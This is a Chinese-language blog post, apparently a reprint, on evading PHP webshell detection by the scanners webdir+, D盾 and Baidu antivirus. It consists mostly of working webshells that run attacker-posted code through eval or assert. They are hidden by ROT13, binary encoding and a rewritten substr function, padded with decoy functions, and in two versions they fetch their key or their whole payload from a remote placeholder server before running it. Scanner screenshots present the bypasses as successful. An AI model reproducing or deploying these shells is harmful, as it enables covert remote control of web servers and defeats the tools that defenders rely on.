<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;riny($_CBFG[mreb]);&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>二进制转化payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">BinToStr</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BinToStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$v</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>)), <span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/5.png" alt="image"></p>
<p>这里就不列举了 只要方法正确 绕过杀软是很简单的</p>
</blockquote>
<h3><span id="0x02通过http获得关键参数">0x02：通过http获得关键参数</span></h3><blockquote>
<p>上面那个凯撒密码不是被webdir+杀了吗 我们在这里将他绕过</p>
<p>众所周知凯撒密码需要设置往前或往后移几位ascii 这个参数可以设置为解密方法的输入参数 经过测试 此参数在源码中会被沙盒跑出了 因此不能过百度杀毒 ，那么 我不写本地不就行了 我直接起一个http服务访问文本获得参数值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxxxx:8080/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$body</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV,<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span>,<span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="variable">$x</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/6.png" alt="image"></p>
<p>当然肯定能用</p>
<p><img src="/2024/01/19/Webshell-Bypass/7.png" alt="image"></p>
<p>但是 这转了一圈简直不低碳啊 我不能直接http获取payload吗 …</p>
<p>简化代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;yshasaui&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxx/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$body</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=121u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;/*Gn212Spe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/8.png" alt="image"></p>
<p><img src="/2024/01/19/Webshell-Bypass/9.png" alt="image"></p>
</blockquote>
<h3><span id="0x03重写函数bypass">0x03：重写函数Bypass</span></h3><blockquote>
<p>众所周知 正则类杀软最喜欢直接把危险函数加入规则 那么 它杀的是函数名 还是逻辑呢？</p>
<p>试一试就知道了</p>
<p>我们的样本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="string">&quot;assertxx&quot;</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是个使用substr函数切割关键字的小马</p>
<p>直接扔到webdir+杀</p>
<p><img src="/2024/01/19/Webshell-Bypass/10.png" alt="image"></p>
<p>毫无疑问的被杀了</p>
<p>那么 我们重写substr函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后把函数替换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;assert(xyz@&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =  <span class="title function_ invoke__">mysubstr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>再拿去杀</p>
<p><img src="/2024/01/19/Webshell-Bypass/11.png" alt="image"></p>
<p>结论很清楚了</p>
<p>再来D盾杀一下</p>
<p><img src="/2024/01/19/Webshell-Bypass/12.png" alt="image"></p>
<p>不错 报2级了 这就是沙盒型查杀和正则类查杀的明显区别 怎么过呢 用构造方法即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/13.png" alt="image"></p>
<p>看到这里大家可能也很奇怪 这里都没用到mysubstr函数 放上去不是多此一举吗</p>
<p>不好意思 恰恰不是 我们可以去掉这个函数 用D盾杀一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/14.png" alt="image"></p>
<p>怎么样 是不是很有趣</p>
<p>这里放这堆代码并不是为了真的用它 而是为了过D盾的特征查杀 所以放什么函数是无所谓的。</p>
<p>比如这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/15.png" alt="image"></p>
<p>这里只介绍了重写substr函数 那么其他的函数可以吗 当然可以</p>
</blockquote>
<h3><span id="0x04写在后面">0x04：写在后面</span></h3><blockquote>
<p>只要思想不滑坡 方法总比困难多</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Webshell/" rel="tag">Webshell</a>
            </div>
        

    </section>
</article>
  
</section>


        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/artchen" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
